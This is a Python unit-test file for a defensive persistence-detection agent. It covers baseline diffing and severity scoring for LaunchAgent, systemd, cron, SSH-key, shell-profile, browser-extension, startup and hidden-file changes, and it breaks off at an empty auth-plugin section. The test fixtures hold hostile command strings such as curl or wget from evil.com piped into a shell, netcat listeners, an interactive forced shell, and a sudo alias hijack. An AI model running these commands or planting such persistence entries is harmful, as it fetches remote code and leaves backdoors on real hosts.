"""Unit tests for persistence/probes.py — baseline engine, detection patterns, and all 10 probes.

Covers uncovered code paths:
    - PersistenceBaselineEngine: load, save, compare (CREATED/DELETED/MODIFIED/ENABLED/DISABLED)
    - Detection helpers: is_suspicious_command, is_suspicious_path
    - LaunchAgentDaemonProbe: CREATED (suspicious cmd, path, user), MODIFIED
    - SystemdServicePersistenceProbe: CREATED, MODIFIED, ENABLED, DISABLED
    - CronJobPersistenceProbe: CREATED (@reboot + suspicious, @reboot, suspicious), MODIFIED
    - SSHKeyBackdoorProbe: CREATED (root, forced_command, normal), DELETED
    - ShellProfileHijackProbe: CREATED/MODIFIED with malicious patterns
    - BrowserExtensionPersistenceProbe: CREATED (dangerous perms), MODIFIED
    - StartupFolderLoginItemProbe: CREATED (suspicious), MODIFIED
    - HiddenFilePersistenceProbe: CREATED (executable + suspicious path, executable only, normal)
    - ConfigProfileProbe: CREATED (managed path), MODIFIED
    - AuthPluginProbe: CREATED, MODIFIED, DELETED
    - Factory function
"""

from __future__ import annotations

import json
import os
import time
from unittest.mock import mock_open, patch

import pytest

from amoskys.agents.common.probes import ProbeContext, Severity, TelemetryEvent
from amoskys.agents.persistence.probes import (
    AuthPluginProbe,
    BrowserExtensionPersistenceProbe,
    ConfigProfileProbe,
    CronJobPersistenceProbe,
    HiddenFilePersistenceProbe,
    LaunchAgentDaemonProbe,
    PersistenceBaselineEngine,
    PersistenceChange,
    PersistenceChangeType,
    PersistenceEntry,
    ShellProfileHijackProbe,
    SSHKeyBackdoorProbe,
    StartupFolderLoginItemProbe,
    SystemdServicePersistenceProbe,
    create_persistence_probes,
    is_suspicious_command,
    is_suspicious_path,
)

# =============================================================================
# Helpers
# =============================================================================

NOW_NS = int(time.time() * 1e9)


def _entry(
    entry_id: str = "test-entry",
    mechanism_type: str = "LAUNCH_AGENT",
    user: str | None = None,
    path: str | None = None,
    command: str | None = None,
    args: str | None = None,
    enabled: bool = True,
    hash_val: str | None = None,
    metadata: dict | None = None,
) -> PersistenceEntry:
    return PersistenceEntry(
        id=entry_id,
        mechanism_type=mechanism_type,
        user=user,
        path=path,
        command=command,
        args=args,
        enabled=enabled,
        hash=hash_val,
        metadata=metadata or {},
        last_seen_ns=NOW_NS,
    )


def _change(
    entry_id: str = "test-entry",
    mechanism_type: str = "LAUNCH_AGENT",
    change_type: PersistenceChangeType = PersistenceChangeType.CREATED,
    old_entry: PersistenceEntry | None = None,
    new_entry: PersistenceEntry | None = None,
) -> PersistenceChange:
    return PersistenceChange(
        entry_id=entry_id,
        mechanism_type=mechanism_type,
        change_type=change_type,
        old_entry=old_entry,
        new_entry=new_entry,
        timestamp_ns=NOW_NS,
    )


def _ctx(changes: list[PersistenceChange] | None = None) -> ProbeContext:
    return ProbeContext(
        device_id="test-host",
        agent_name="persistence_guard",
        shared_data={"persistence_changes": changes or []},
    )


# =============================================================================
# Detection Helpers
# =============================================================================


class TestIsSuspiciousCommand:
    """Test is_suspicious_command helper."""

    def test_none_returns_false(self):
        assert is_suspicious_command(None) is False

    def test_empty_returns_false(self):
        assert is_suspicious_command("") is False

    def test_bash_detected(self):
        assert is_suspicious_command("/bin/bash -c 'wget ...'") is True

    def test_python_detected(self):
        assert is_suspicious_command("python -c 'import os'") is True

    def test_curl_pipe_detected(self):
        assert is_suspicious_command("curl http://evil.com | sh") is True

    def test_netcat_detected(self):
        assert is_suspicious_command("nc -l 4444") is True

    def test_tmp_path_detected(self):
        assert is_suspicious_command("/tmp/backdoor") is True

    def test_eval_detected(self):
        assert is_suspicious_command("eval (decode payload)") is True

    def test_safe_command(self):
        assert is_suspicious_command("/usr/bin/healthy-service") is False

    def test_wget_pipe_detected(self):
        assert is_suspicious_command("wget http://evil.com | bash") is True


class TestIsSuspiciousPath:
    """Test is_suspicious_path helper."""

    def test_none_returns_false(self):
        assert is_suspicious_path(None) is False

    def test_empty_returns_false(self):
        assert is_suspicious_path("") is False

    def test_tmp_detected(self):
        assert is_suspicious_path("/tmp/evil.sh") is True

    def test_var_tmp_detected(self):
        assert is_suspicious_path("/var/tmp/backdoor") is True

    def test_dev_shm_detected(self):
        assert is_suspicious_path("/dev/shm/payload") is True

    def test_users_shared_detected(self):
        assert is_suspicious_path("/Users/Shared/malware") is True

    def test_safe_path(self):
        assert is_suspicious_path("/usr/local/bin/service") is False


# =============================================================================
# PersistenceBaselineEngine
# =============================================================================


class TestPersistenceBaselineEngine:
    """Test baseline engine load, save, compare."""

    def test_load_missing_file(self, tmp_path):
        """Missing file returns False."""
        engine = PersistenceBaselineEngine(str(tmp_path / "nonexistent.json"))
        result = engine.load()
        assert result is False

    def test_load_valid_file(self, tmp_path):
        """Valid JSON file loads successfully."""
        baseline_path = tmp_path / "baseline.json"
        entry_data = {
            "e1": {
                "id": "e1",
                "mechanism_type": "LAUNCH_AGENT",
                "user": "root",
                "path": "/Library/LaunchAgents/test.plist",
                "command": "/usr/bin/test",
                "args": None,
                "enabled": True,
                "hash": "abc123",
                "metadata": {},
                "last_seen_ns": NOW_NS,
            }
        }
        baseline_path.write_text(json.dumps(entry_data))

        engine = PersistenceBaselineEngine(str(baseline_path))
        result = engine.load()

        assert result is True
        assert "e1" in engine.entries
        assert engine.entries["e1"].mechanism_type == "LAUNCH_AGENT"

    def test_load_invalid_json(self, tmp_path):
        """Invalid JSON returns False."""
        baseline_path = tmp_path / "bad.json"
        baseline_path.write_text("not valid json {{}")

        engine = PersistenceBaselineEngine(str(baseline_path))
        result = engine.load()

        assert result is False

    def test_save_creates_file(self, tmp_path):
        """Save creates JSON file on disk."""
        baseline_path = tmp_path / "sub" / "baseline.json"
        engine = PersistenceBaselineEngine(str(baseline_path))
        engine.entries = {"e1": _entry("e1")}

        engine.save()

        assert baseline_path.exists()
        data = json.loads(baseline_path.read_text())
        assert "e1" in data

    def test_save_os_error(self, tmp_path):
        """OSError during save is handled gracefully."""
        engine = PersistenceBaselineEngine("/nonexistent/deep/path/baseline.json")
        engine.entries = {"e1": _entry("e1")}

        # On some systems this may succeed (creating dirs), on others fail
        # Just verify it doesn't crash
        engine.save()

    def test_create_from_snapshot(self):
        """create_from_snapshot initializes entries."""
        engine = PersistenceBaselineEngine("/tmp/test_baseline.json")
        snapshot = {"e1": _entry("e1"), "e2": _entry("e2")}

        engine.create_from_snapshot(snapshot)

        assert len(engine.entries) == 2

    def test_compare_created(self):
        """New entry in current but not baseline => CREATED."""
        engine = PersistenceBaselineEngine("/tmp/test.json")
        engine.entries = {}

        current = {"new1": _entry("new1")}
        changes = engine.compare(current)

        assert len(changes) == 1
        assert changes[0].change_type == PersistenceChangeType.CREATED

    def test_compare_deleted(self):
        """Entry in baseline but not current => DELETED."""
        engine = PersistenceBaselineEngine("/tmp/test.json")
        engine.entries = {"old1": _entry("old1")}

        changes = engine.compare({})

        assert len(changes) == 1
        assert changes[0].change_type == PersistenceChangeType.DELETED

    def test_compare_enabled(self):
        """Entry transitions from disabled to enabled => ENABLED."""
        engine = PersistenceBaselineEngine("/tmp/test.json")
        engine.entries = {"e1": _entry("e1", enabled=False)}

        current = {"e1": _entry("e1", enabled=True)}
        changes = engine.compare(current)

        assert len(changes) == 1
        assert changes[0].change_type == PersistenceChangeType.ENABLED

    def test_compare_disabled(self):
        """Entry transitions from enabled to disabled => DISABLED."""
        engine = PersistenceBaselineEngine("/tmp/test.json")
        engine.entries = {"e1": _entry("e1", enabled=True)}

        current = {"e1": _entry("e1", enabled=False)}
        changes = engine.compare(current)

        assert len(changes) == 1
        assert changes[0].change_type == PersistenceChangeType.DISABLED

    def test_compare_modified_command(self):
        """Changed command => MODIFIED."""
        engine = PersistenceBaselineEngine("/tmp/test.json")
        engine.entries = {"e1": _entry("e1", command="/usr/bin/old")}

        current = {"e1": _entry("e1", command="/usr/bin/new")}
        changes = engine.compare(current)

        assert len(changes) == 1
        assert changes[0].change_type == PersistenceChangeType.MODIFIED

    def test_compare_modified_hash(self):
        """Changed hash => MODIFIED."""
        engine = PersistenceBaselineEngine("/tmp/test.json")
        engine.entries = {"e1": _entry("e1", hash_val="aaa")}

        current = {"e1": _entry("e1", hash_val="bbb")}
        changes = engine.compare(current)

        assert len(changes) == 1
        assert changes[0].change_type == PersistenceChangeType.MODIFIED

    def test_compare_modified_args(self):
        """Changed args => MODIFIED."""
        engine = PersistenceBaselineEngine("/tmp/test.json")
        engine.entries = {"e1": _entry("e1", args="--old")}

        current = {"e1": _entry("e1", args="--new")}
        changes = engine.compare(current)

        assert len(changes) == 1
        assert changes[0].change_type == PersistenceChangeType.MODIFIED

    def test_compare_no_change(self):
        """Identical entries produce no changes."""
        engine = PersistenceBaselineEngine("/tmp/test.json")
        e = _entry("e1", command="/usr/bin/safe", hash_val="xyz", args="--flag")
        engine.entries = {"e1": e}

        current = {
            "e1": _entry("e1", command="/usr/bin/safe", hash_val="xyz", args="--flag")
        }
        changes = engine.compare(current)

        assert len(changes) == 0


# =============================================================================
# LaunchAgentDaemonProbe
# =============================================================================


class TestLaunchAgentDaemonProbe:
    """Tests for LaunchAgentDaemonProbe."""

    def test_created_normal(self):
        """New LaunchAgent with safe command => MEDIUM."""
        probe = LaunchAgentDaemonProbe()
        entry = _entry("la1", "LAUNCH_AGENT", command="/usr/bin/safe", user="root")
        change = _change(
            "la1", "LAUNCH_AGENT", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].severity == Severity.MEDIUM

    def test_created_suspicious_command(self):
        """New LaunchAgent with suspicious command => HIGH."""
        probe = LaunchAgentDaemonProbe()
        entry = _entry("la2", "LAUNCH_AGENT", command="curl evil.com | bash")
        change = _change(
            "la2", "LAUNCH_AGENT", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].severity == Severity.HIGH

    def test_created_suspicious_path(self):
        """New LaunchAgent in /tmp => HIGH."""
        probe = LaunchAgentDaemonProbe()
        entry = _entry(
            "la3", "LAUNCH_AGENT", path="/tmp/com.malware.plist", command="/usr/bin/ok"
        )
        change = _change(
            "la3", "LAUNCH_AGENT", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].severity == Severity.HIGH

    def test_created_user_owned(self):
        """Non-root user-owned LaunchAgent => HIGH."""
        probe = LaunchAgentDaemonProbe()
        entry = _entry("la4", "LAUNCH_AGENT", user="alice", command="/usr/bin/ok")
        change = _change(
            "la4", "LAUNCH_AGENT", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].severity == Severity.HIGH

    def test_modified_suspicious_command(self):
        """Modified LaunchAgent with suspicious command => HIGH."""
        probe = LaunchAgentDaemonProbe()
        old_entry = _entry("la5", "LAUNCH_AGENT", command="/usr/bin/safe")
        new_entry = _entry("la5", "LAUNCH_AGENT", command="python -c 'import os'")
        change = _change(
            "la5",
            "LAUNCH_AGENT",
            PersistenceChangeType.MODIFIED,
            old_entry=old_entry,
            new_entry=new_entry,
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].severity == Severity.HIGH

    def test_modified_safe_command(self):
        """Modified LaunchAgent with safe command => MEDIUM."""
        probe = LaunchAgentDaemonProbe()
        old_entry = _entry("la6", "LAUNCH_AGENT", command="/usr/bin/v1")
        new_entry = _entry("la6", "LAUNCH_AGENT", command="/usr/bin/v2")
        change = _change(
            "la6",
            "LAUNCH_AGENT",
            PersistenceChangeType.MODIFIED,
            old_entry=old_entry,
            new_entry=new_entry,
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].severity == Severity.MEDIUM

    def test_other_mechanism_ignored(self):
        """SYSTEMD_SERVICE mechanism is ignored by LaunchAgentProbe."""
        probe = LaunchAgentDaemonProbe()
        entry = _entry("sys1", "SYSTEMD_SERVICE")
        change = _change(
            "sys1", "SYSTEMD_SERVICE", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 0

    def test_no_entry_skipped(self):
        """Change with neither old nor new entry is skipped."""
        probe = LaunchAgentDaemonProbe()
        change = _change("la7", "LAUNCH_AGENT", PersistenceChangeType.CREATED)
        events = probe.scan(_ctx([change]))

        assert len(events) == 0

    def test_launch_daemon_also_handled(self):
        """LAUNCH_DAEMON mechanism is handled."""
        probe = LaunchAgentDaemonProbe()
        entry = _entry("ld1", "LAUNCH_DAEMON", command="/usr/sbin/daemon")
        change = _change(
            "ld1", "LAUNCH_DAEMON", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1


# =============================================================================
# SystemdServicePersistenceProbe
# =============================================================================


class TestSystemdServicePersistenceProbe:
    """Tests for SystemdServicePersistenceProbe."""

    def test_created_normal(self):
        """New systemd service => MEDIUM."""
        probe = SystemdServicePersistenceProbe()
        entry = _entry(
            "svc1", "SYSTEMD_SERVICE", command="/usr/bin/service", user="root"
        )
        change = _change(
            "svc1", "SYSTEMD_SERVICE", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].event_type == "persistence_systemd_service_created"
        assert events[0].severity == Severity.MEDIUM

    def test_created_suspicious_command(self):
        """Suspicious ExecStart => HIGH."""
        probe = SystemdServicePersistenceProbe()
        entry = _entry("svc2", "SYSTEMD_SERVICE", command="bash -c 'nc -l 4444'")
        change = _change(
            "svc2", "SYSTEMD_SERVICE", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.HIGH

    def test_created_suspicious_path(self):
        """Service in suspicious path => HIGH."""
        probe = SystemdServicePersistenceProbe()
        entry = _entry(
            "svc3", "SYSTEMD_SERVICE", path="/tmp/evil.service", command="/usr/bin/ok"
        )
        change = _change(
            "svc3", "SYSTEMD_SERVICE", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.HIGH

    def test_created_user_owned(self):
        """Non-root user service => HIGH."""
        probe = SystemdServicePersistenceProbe()
        entry = _entry("svc4", "SYSTEMD_SERVICE", user="bob", command="/usr/bin/ok")
        change = _change(
            "svc4", "SYSTEMD_SERVICE", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.HIGH

    def test_modified_suspicious(self):
        """Modified ExecStart to suspicious => HIGH."""
        probe = SystemdServicePersistenceProbe()
        old = _entry("svc5", "SYSTEMD_SERVICE", command="/usr/bin/ok")
        new = _entry("svc5", "SYSTEMD_SERVICE", command="perl -e 'system(...)'")
        change = _change(
            "svc5",
            "SYSTEMD_SERVICE",
            PersistenceChangeType.MODIFIED,
            old_entry=old,
            new_entry=new,
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.HIGH

    def test_enabled(self):
        """Service enabled => MEDIUM."""
        probe = SystemdServicePersistenceProbe()
        old = _entry("svc6", "SYSTEMD_SERVICE", enabled=False)
        new = _entry("svc6", "SYSTEMD_SERVICE", enabled=True)
        change = _change(
            "svc6",
            "SYSTEMD_SERVICE",
            PersistenceChangeType.ENABLED,
            old_entry=old,
            new_entry=new,
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].event_type == "persistence_systemd_service_enabled"
        assert events[0].severity == Severity.MEDIUM

    def test_disabled(self):
        """Service disabled => INFO."""
        probe = SystemdServicePersistenceProbe()
        old = _entry("svc7", "SYSTEMD_SERVICE", enabled=True)
        new = _entry("svc7", "SYSTEMD_SERVICE", enabled=False)
        change = _change(
            "svc7",
            "SYSTEMD_SERVICE",
            PersistenceChangeType.DISABLED,
            old_entry=old,
            new_entry=new,
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].event_type == "persistence_systemd_service_disabled"
        assert events[0].severity == Severity.INFO


# =============================================================================
# CronJobPersistenceProbe
# =============================================================================


class TestCronJobPersistenceProbe:
    """Tests for CronJobPersistenceProbe."""

    def test_created_reboot_suspicious(self):
        """@reboot cron with suspicious command => HIGH."""
        probe = CronJobPersistenceProbe()
        entry = _entry(
            "cron1",
            "CRON_JOB",
            command="curl evil.com | sh",
            metadata={"schedule": "@reboot"},
        )
        change = _change(
            "cron1", "CRON_JOB", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].severity == Severity.HIGH
        assert "@reboot" in events[0].data["reason"]

    def test_created_reboot_safe(self):
        """@reboot cron with safe command => HIGH (still reboot)."""
        probe = CronJobPersistenceProbe()
        entry = _entry(
            "cron2",
            "CRON_JOB",
            command="/usr/bin/safe",
            metadata={"schedule": "@reboot"},
        )
        change = _change(
            "cron2", "CRON_JOB", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.HIGH

    def test_created_suspicious_no_reboot(self):
        """Suspicious command without @reboot => HIGH."""
        probe = CronJobPersistenceProbe()
        entry = _entry(
            "cron3",
            "CRON_JOB",
            command="python -c 'import socket'",
            metadata={"schedule": "*/5 * * * *"},
        )
        change = _change(
            "cron3", "CRON_JOB", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.HIGH

    def test_created_normal(self):
        """Normal cron job => MEDIUM."""
        probe = CronJobPersistenceProbe()
        entry = _entry(
            "cron4",
            "CRON_JOB",
            command="/usr/local/bin/backup",
            metadata={"schedule": "0 2 * * *"},
        )
        change = _change(
            "cron4", "CRON_JOB", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.MEDIUM

    def test_modified_suspicious(self):
        """Modified cron with suspicious command => HIGH."""
        probe = CronJobPersistenceProbe()
        old = _entry("cron5", "CRON_JOB", command="/usr/bin/old")
        new = _entry("cron5", "CRON_JOB", command="wget http://evil.com | bash")
        change = _change(
            "cron5",
            "CRON_JOB",
            PersistenceChangeType.MODIFIED,
            old_entry=old,
            new_entry=new,
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.HIGH

    def test_modified_safe(self):
        """Modified cron with safe command => MEDIUM."""
        probe = CronJobPersistenceProbe()
        old = _entry("cron6", "CRON_JOB", command="/usr/bin/v1")
        new = _entry("cron6", "CRON_JOB", command="/usr/bin/v2")
        change = _change(
            "cron6",
            "CRON_JOB",
            PersistenceChangeType.MODIFIED,
            old_entry=old,
            new_entry=new,
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.MEDIUM


# =============================================================================
# SSHKeyBackdoorProbe
# =============================================================================


class TestSSHKeyBackdoorProbe:
    """Tests for SSHKeyBackdoorProbe."""

    def test_created_root_key(self):
        """New SSH key for root => CRITICAL."""
        probe = SSHKeyBackdoorProbe()
        entry = _entry(
            "ssh1", "SSH_AUTHORIZED_KEY", user="root", path="/root/.ssh/authorized_keys"
        )
        change = _change(
            "ssh1", "SSH_AUTHORIZED_KEY", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].severity == Severity.CRITICAL

    def test_created_admin_key(self):
        """New SSH key for admin => CRITICAL."""
        probe = SSHKeyBackdoorProbe()
        entry = _entry("ssh2", "SSH_AUTHORIZED_KEY", user="admin")
        change = _change(
            "ssh2", "SSH_AUTHORIZED_KEY", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.CRITICAL

    def test_created_forced_command(self):
        """New SSH key with forced command => HIGH."""
        probe = SSHKeyBackdoorProbe()
        entry = _entry(
            "ssh3",
            "SSH_AUTHORIZED_KEY",
            user="deploy",
            metadata={"has_forced_command": True, "forced_command": "bash -i"},
        )
        change = _change(
            "ssh3", "SSH_AUTHORIZED_KEY", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.HIGH
        assert events[0].data["forced_command"] is True

    def test_created_normal_user(self):
        """New SSH key for normal user => HIGH."""
        probe = SSHKeyBackdoorProbe()
        entry = _entry("ssh4", "SSH_AUTHORIZED_KEY", user="alice")
        change = _change(
            "ssh4", "SSH_AUTHORIZED_KEY", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.HIGH

    def test_deleted_key(self):
        """Removed SSH key => INFO."""
        probe = SSHKeyBackdoorProbe()
        entry = _entry("ssh5", "SSH_AUTHORIZED_KEY", user="bob")
        change = _change(
            "ssh5", "SSH_AUTHORIZED_KEY", PersistenceChangeType.DELETED, old_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].event_type == "persistence_ssh_key_removed"
        assert events[0].severity == Severity.INFO


# =============================================================================
# ShellProfileHijackProbe
# =============================================================================


class TestShellProfileHijackProbe:
    """Tests for ShellProfileHijackProbe."""

    def test_created_with_malicious_pattern(self):
        """Shell profile with curl | bash => HIGH."""
        probe = ShellProfileHijackProbe()
        entry = _entry(
            "sp1",
            "SHELL_PROFILE",
            path="/home/user/.bashrc",
            command="curl http://evil.com | bash",
        )
        change = _change(
            "sp1", "SHELL_PROFILE", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].severity == Severity.HIGH
        assert "suspicious" in events[0].data["reason"].lower()

    def test_modified_with_sudo_alias(self):
        """Shell profile with alias sudo= => HIGH."""
        probe = ShellProfileHijackProbe()
        entry = _entry(
            "sp2",
            "SHELL_PROFILE",
            command="alias sudo=/tmp/fake-sudo",
        )
        change = _change(
            "sp2", "SHELL_PROFILE", PersistenceChangeType.MODIFIED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.HIGH

    def test_created_safe_profile(self):
        """Safe shell profile modification => MEDIUM."""
        probe = ShellProfileHijackProbe()
        entry = _entry(
            "sp3",
            "SHELL_PROFILE",
            command="export PATH=$HOME/bin:$PATH",
        )
        change = _change(
            "sp3", "SHELL_PROFILE", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.MEDIUM

    def test_no_command(self):
        """Profile change with no command => MEDIUM, no pattern match."""
        probe = ShellProfileHijackProbe()
        entry = _entry("sp4", "SHELL_PROFILE", command=None)
        change = _change(
            "sp4", "SHELL_PROFILE", PersistenceChangeType.MODIFIED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.MEDIUM
        assert events[0].data["suspicious_patterns"] == ""


# =============================================================================
# BrowserExtensionPersistenceProbe
# =============================================================================


class TestBrowserExtensionPersistenceProbe:
    """Tests for BrowserExtensionPersistenceProbe."""

    def test_created_dangerous_unknown_publisher(self):
        """Unknown publisher with dangerous permissions => HIGH."""
        probe = BrowserExtensionPersistenceProbe()
        entry = _entry(
            "ext1",
            "BROWSER_EXTENSION",
            metadata={
                "permissions": "tabs,webRequest,<all_urls>",
                "unknown_publisher": True,
                "browser": "chrome",
                "name": "EvilHelper",
            },
        )
        change = _change(
            "ext1", "BROWSER_EXTENSION", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].severity == Severity.HIGH

    def test_created_known_publisher(self):
        """Known publisher extension => MEDIUM."""
        probe = BrowserExtensionPersistenceProbe()
        entry = _entry(
            "ext2",
            "BROWSER_EXTENSION",
            metadata={
                "permissions": "tabs",
                "unknown_publisher": False,
                "browser": "firefox",
                "name": "uBlock",
            },
        )
        change = _change(
            "ext2", "BROWSER_EXTENSION", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.MEDIUM

    def test_modified_extension(self):
        """Modified extension => MEDIUM."""
        probe = BrowserExtensionPersistenceProbe()
        entry = _entry(
            "ext3",
            "BROWSER_EXTENSION",
            metadata={"browser": "chrome", "name": "TestExt"},
        )
        change = _change(
            "ext3", "BROWSER_EXTENSION", PersistenceChangeType.MODIFIED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].event_type == "persistence_browser_extension_modified"


# =============================================================================
# StartupFolderLoginItemProbe
# =============================================================================


class TestStartupFolderLoginItemProbe:
    """Tests for StartupFolderLoginItemProbe."""

    def test_created_suspicious(self):
        """Startup item with suspicious command => HIGH."""
        probe = StartupFolderLoginItemProbe()
        entry = _entry("si1", "STARTUP_ITEM", command="/tmp/backdoor.sh")
        change = _change(
            "si1", "STARTUP_ITEM", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.HIGH

    def test_created_suspicious_path(self):
        """Startup item in suspicious path => HIGH."""
        probe = StartupFolderLoginItemProbe()
        entry = _entry(
            "si2", "STARTUP_ITEM", path="/var/tmp/evil", command="/usr/bin/ok"
        )
        change = _change(
            "si2", "STARTUP_ITEM", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.HIGH

    def test_created_normal(self):
        """Normal startup item => MEDIUM."""
        probe = StartupFolderLoginItemProbe()
        entry = _entry(
            "si3", "STARTUP_ITEM", command="/usr/bin/safe", path="/Applications/App.app"
        )
        change = _change(
            "si3", "STARTUP_ITEM", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.MEDIUM

    def test_modified_suspicious(self):
        """Modified startup item with suspicious command => HIGH."""
        probe = StartupFolderLoginItemProbe()
        old = _entry("si4", "STARTUP_ITEM", command="/usr/bin/safe")
        new = _entry("si4", "STARTUP_ITEM", command="bash -c 'nc -l 1234'")
        change = _change(
            "si4",
            "STARTUP_ITEM",
            PersistenceChangeType.MODIFIED,
            old_entry=old,
            new_entry=new,
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.HIGH

    def test_modified_safe(self):
        """Modified startup item with safe command => MEDIUM."""
        probe = StartupFolderLoginItemProbe()
        old = _entry("si5", "STARTUP_ITEM", command="/usr/bin/v1")
        new = _entry("si5", "STARTUP_ITEM", command="/usr/bin/v2")
        change = _change(
            "si5",
            "STARTUP_ITEM",
            PersistenceChangeType.MODIFIED,
            old_entry=old,
            new_entry=new,
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.MEDIUM


# =============================================================================
# HiddenFilePersistenceProbe
# =============================================================================


class TestHiddenFilePersistenceProbe:
    """Tests for HiddenFilePersistenceProbe."""

    def test_created_executable_suspicious_path(self):
        """Hidden executable in /tmp => HIGH."""
        probe = HiddenFilePersistenceProbe()
        entry = _entry(
            "hf1",
            "HIDDEN_FILE_PERSISTENCE",
            path="/tmp/.hidden_loader",
            metadata={"is_executable": True},
        )
        change = _change(
            "hf1",
            "HIDDEN_FILE_PERSISTENCE",
            PersistenceChangeType.CREATED,
            new_entry=entry,
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].severity == Severity.HIGH
        assert "suspicious directory" in events[0].data["reason"]

    def test_created_executable_normal_path(self):
        """Hidden executable in normal path => HIGH."""
        probe = HiddenFilePersistenceProbe()
        entry = _entry(
            "hf2",
            "HIDDEN_FILE_PERSISTENCE",
            path="/home/user/.hidden_binary",
            metadata={"is_executable": True},
        )
        change = _change(
            "hf2",
            "HIDDEN_FILE_PERSISTENCE",
            PersistenceChangeType.CREATED,
            new_entry=entry,
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.HIGH
        assert "hidden executable" in events[0].data["reason"].lower()

    def test_created_non_executable(self):
        """Non-executable hidden file => MEDIUM."""
        probe = HiddenFilePersistenceProbe()
        entry = _entry(
            "hf3",
            "HIDDEN_FILE_PERSISTENCE",
            path="/home/user/.config",
            metadata={"is_executable": False},
        )
        change = _change(
            "hf3",
            "HIDDEN_FILE_PERSISTENCE",
            PersistenceChangeType.CREATED,
            new_entry=entry,
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.MEDIUM


# =============================================================================
# ConfigProfileProbe
# =============================================================================


class TestConfigProfileProbe:
    """Tests for ConfigProfileProbe."""

    def test_created_managed_path(self):
        """Profile in /Library/Managed Preferences/ => HIGH."""
        probe = ConfigProfileProbe()
        entry = _entry(
            "cp1",
            "CONFIG_PROFILE",
            path="/Library/Managed Preferences/com.evil.mdm.plist",
            metadata={"name": "EvilMDM", "uuid": "abc-123", "scope": "system"},
        )
        change = _change(
            "cp1", "CONFIG_PROFILE", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].severity == Severity.HIGH
        assert "MDM" in events[0].data["reason"]

    def test_created_normal_path(self):
        """Profile in normal path => MEDIUM."""
        probe = ConfigProfileProbe()
        entry = _entry(
            "cp2",
            "CONFIG_PROFILE",
            path="/usr/local/etc/config.plist",
            metadata={"name": "TestProfile"},
        )
        change = _change(
            "cp2", "CONFIG_PROFILE", PersistenceChangeType.CREATED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert events[0].severity == Severity.MEDIUM

    def test_modified(self):
        """Modified profile => MEDIUM."""
        probe = ConfigProfileProbe()
        entry = _entry(
            "cp3",
            "CONFIG_PROFILE",
            path="/Library/test.plist",
            metadata={"name": "Test"},
        )
        change = _change(
            "cp3", "CONFIG_PROFILE", PersistenceChangeType.MODIFIED, new_entry=entry
        )
        events = probe.scan(_ctx([change]))

        assert len(events) == 1
        assert events[0].event_type == "persistence_config_profile_modified"


# =============================================================================
# AuthPluginProbe
# =============================================================================


